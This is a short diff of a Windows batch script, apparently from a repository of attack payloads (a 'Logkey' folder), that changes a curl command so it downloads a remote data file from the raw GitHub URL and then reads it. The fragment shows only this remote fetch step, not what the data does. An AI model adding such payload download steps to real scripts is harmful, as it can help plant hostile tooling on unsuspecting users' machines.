@@ -6,7 +6,7 @@ set "debug=0"
 
 
 :: Get data from file
-curl -Lo data.logkey https://github.com/Jed556/Payloads/blob/main/Logkey/data.logkey
+curl -Lo data.logkey https://raw.githubusercontent.com/Jed556/Payloads/main/Logkey/data.logkey
 setlocal EnableDelayedExpansion EnableExtensions
 set "data="
 for /f "delims=" %%i in (data.logkey) do (
